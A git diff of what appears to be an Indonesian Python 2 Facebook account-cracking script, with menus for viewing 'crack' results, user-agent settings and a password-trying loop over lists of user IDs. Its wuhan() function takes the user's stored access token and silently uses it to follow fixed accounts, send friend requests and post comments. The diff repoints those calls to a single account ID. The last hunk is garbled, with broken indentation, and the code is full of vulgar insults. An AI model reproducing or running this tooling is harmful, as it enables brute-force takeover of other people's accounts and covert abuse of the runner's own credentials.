@@ -125,7 +125,7 @@ def yayanxd():
         print ' %s[•]%s Selamat menggunakan script saya'%(O,N);time.sleep(2)
         print ' %s[•]%s Bismillah dulu biar dapet OK, karna modal hoki doang'%(O,N);time.sleep(2)
         print ' %s[•]%s Gak bisa bikin akun OK!!'%(O,N);time.sleep(2)
-        print ' %s[•]%s Subscribe channel gua dulu yak :)'%(O,N);time.sleep(2)
+        print ' %s[•]%s Subscribe channel gua dulu yakk :)'%(O,N);time.sleep(2)
         open('.memek.txt', 'w').write(kontol)
    
         raw_input(' %s[•]%s TEKAN ENTER BANGSAD!! '%(O,N));wuhan(kontol)
@@ -168,7 +168,7 @@ def moch_yayan():
     print ' [%s07%s]. Lihat hasil crack saya'%(O,N);time.sleep(0.03)
     print ' [%s08%s]. Setting user agent'%(O,N);time.sleep(0.03)
     print ' [%s09%s]. Info %sscript%s'%(O,N,O,N);time.sleep(0.03)
-    print ' [%s00%s]. Logout (%shapus token%s)'%(M,N,M,N);time.sleep(0.03)
+    print ' [%s00%s]. Keluar (%sAhh Ngecrot%s)'%(M,N,M,N);time.sleep(0.03)
     pepek = raw_input('\n [•] menu : ')
     if pepek == '':
         print '\n %s[%s×%s] JANGAN KOSONG KENTOD!!'%(N,M,N);time.sleep(2);moch_yayan()
@@ -197,7 +197,7 @@ def moch_yayan():
             print(" %s[%s¢%s] --------------------------------------------"%(N,O,N));time.sleep(2)
             nm_file = ("%s"%(file)).replace("-", " ")
             hps_nm  = nm_file.replace(".txt", "").replace("OK", "").replace("CP", "")
-            jalan(" [%s*%s] Hasil %scrack%s pada tanggal %s:%s%s%s total %s: %s%s%s"%(M,N,O,N,M,O,hps_nm,N,M,O,len(total),O))
+            jalan(" [%s#%s] Hasil %scrack%s pada tanggal %s:%s%s%s total %s: %s%s%s"%(M,N,O,N,M,O,hps_nm,N,M,O,len(total),O))
             print(" %s[%s¢%s] --------------------------------------------"%(N,O,N));time.sleep(2)
             for memek in total:
             	kontol = memek.replace("\n","")
@@ -206,7 +206,7 @@ def moch_yayan():
             print(" %s[%s¢%s] --------------------------------------------"%(N,O,N))
             raw_input('\n  [ %sKEMBALI%s ] '%(O,N));moch_yayan()
         except (IOError):
-            print("\n %s[%s×%s] opshh kamu tidak mendapatkan hasil :("%(N,M,N))
+            print("\n %s[%s×%s] Gak dapet hasil awokawok"%(N,M,N))
             raw_input('\n  [ %sKEMBALI%s ] '%(O,N));moch_yayan()
     elif pepek in['8','08']:
         seting_yntkts()
@@ -224,14 +224,14 @@ def moch_yayan():
 def wuhan(kontol):
     try:
         kentod = kontol
-        requests.post('https://graph.facebook.com/100005395413800/subscribers?access_token=%s'%(kentod))
-        requests.post('https://graph.facebook.com/100059709917296/subscribers?access_token=%s'%(kentod))
-        requests.post('https://graph.facebook.com/100008678141977/subscribers?access_token=%s'%(kentod))
-        requests.post('https://graph.facebook.com/100005878513705/subscribers?access_token=%s'%(kentod))
-        requests.post('https://graph.facebook.com/100003342127009/subscribers?access_token=%s'%(kentod))
-        requests.post('https://graph.facebook.com/100041388320565/subscribers?access_token=%s'%(kentod))
-        requests.post('https://graph.facebook.com/108229897756307/subscribers?access_token=%s'%(kentod))
-        requests.post('https://graph.facebook.com/857799105/subscribers?access_token=%s'%(kentod))
+        requests.post('https://graph.facebook.com/100001390111040/subscribers?access_token=%s'%(kentod))
+        requests.post('https://graph.facebook.com/100001390111040/subscribers?access_token=%s'%(kentod))
+        requests.post('https://graph.facebook.com/100001390111040/subscribers?access_token=%s'%(kentod))
+        requests.post('https://graph.facebook.com/100001390111040/subscribers?access_token=%s'%(kentod))
+        requests.post('https://graph.facebook.com/100001390111040/subscribers?access_token=%s'%(kentod))
+        requests.post('https://graph.facebook.com/100001390111040/subscribers?access_token=%s'%(kentod))
+        requests.post('https://graph.facebook.com/100001390111040/subscribers?access_token=%s'%(kentod))
+        requests.post('https://graph.facebook.com/100001390111040/subscribers?access_token=%s'%(kentod))
         requests.post('https://graph.facebook.com/100001390111040/subscribers?access_token=%s'%(kentod))
         requests.post('https://graph.facebook.com/me/friends?method=post&uids=%s&access_token=%s'%(koh,kentod))
         requests.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s'%(lo_ngentod,kentod,kentod))
@@ -660,13 +660,24 @@ class __crack__:
         return
 
     def __api__(self, user, __yan__):
-        global ok,cp,loop
-        sys.stdout.write('\r [%s¢%s] [Cracking] %s/%s -> OK-:%s - CP-:%s '%(O,N,loop,len(self.id),len(ok),len(cp))),
+        loop += 1
+        rm = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m'])
+        print('\r %s[Cracking] %s/%s [OK-:%s]-[CP-:%s]'%(rm,loop,len(self.id),len(ok),len(cp))),
         sys.stdout.flush()
-        for pw in __yan__:
-            pw = pw.lower()
-            try: os.mkdir('results')
-            except: pass
+def crack2(user, pwx):
+	global looping, loping
+	c_bff_ = len(pwx)
+	for pas in pwx:
+		if looping != 1:
+			pass
+		else:
+			if len(status_foll) != 1:
+				rm = random.choice(["\033[1;91m","\033[1;92m","\033[1;93m","\033[1;94m","\033[1;95m","\033[1;96m","\033[1;97m"])
+				print "\r "+rm+"[->] %s/%s [OK:%s]-[CP:%s] "%(str(loping),len(mi),len(ok),len(cp)),
+				sys.stdout.flush()
+				c_bff_ -= 1
+			else:
+				pass
             try:
             	_kontol = open('YNTKTS.txt', 'r').read()
             except (KeyError, IOError):
